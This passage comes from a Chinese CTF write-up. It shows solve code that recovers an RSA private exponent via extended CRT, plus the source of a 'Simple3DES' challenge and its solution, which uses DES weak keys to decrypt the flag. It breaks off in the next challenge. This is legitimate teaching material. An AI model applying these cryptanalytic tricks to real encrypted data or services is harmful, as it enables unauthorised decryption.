m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>a2 <span class=\"token operator\">-</span> a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> d <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p1<span class=\"token punctuation\">,</span>p2 <span class=\"token operator\">=</span> m1 <span class=\"token operator\">//</span> d<span class=\"token punctuation\">,</span>m2 <span class=\"token operator\">//</span> d</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _<span class=\"token punctuation\">,</span>l1<span class=\"token punctuation\">,</span>l2 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    k <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">-</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> d<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> l1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    lcm <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>lcm<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> k <span class=\"token operator\">*</span> m1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> lcm</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">,</span>lcm</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">excrt</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>union<span class=\"token punctuation\">,</span> tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mi <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>ai <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>dp<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>dr<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>d<span class=\"token punctuation\">,</span>lcm <span class=\"token operator\">=</span> excrt<span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> r</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"simple3des\"><a class=\"markdownIt-Anchor\" href=\"#simple3des\">#</a> Simple3DES</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> DES3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> b<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sec <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">enc</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        key <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        msg <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        des <span class=\"token operator\">=</span> DES3<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>DES3<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        ct <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> bytes_to_long<span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> Exception</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">service</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Simple DES Encryption Service'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">while</span> cnt<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1. Encrypt\\n2. Get encrypted flag.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        choice <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input msg:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            msg <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        cnt<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Bye!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    service<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>去输入相同的 0xFEFEFEFEFEFEFEFE1F1F1F1F0E0E0E0EFEFEFEFEFEFEFEFE 变成 2DES</p>\n<blockquote>\n<p>sha256(XXXX+bdc8ArQJbMwUCQh7) == cd4a27077eaea67b872c59b0232ae722e179992aa8b2c08624667301a9a516d7<br>\nGive me XXXX: KfXV<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nSimple DES Encryption Service<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</p>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>2<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n5645108062031882523941457412438800103538695650524004750720</p>\n</blockquote>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>1<br>\nInput msg:<br>\n5645108062031882523941457412438800103538695650524004750720<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n37699681561444816228091816433931698303804192466855953956737310357621942568417<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nBye!</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">37699681561444816228091816433931698303804192466855953956737310357621942568417</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"just-need-one\"><a class=\"markdownIt-Anchor\" href=\"#just-need-one\">#</a> Just need One</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> hashlib </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"==DEBUG MODE==\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        exit<span 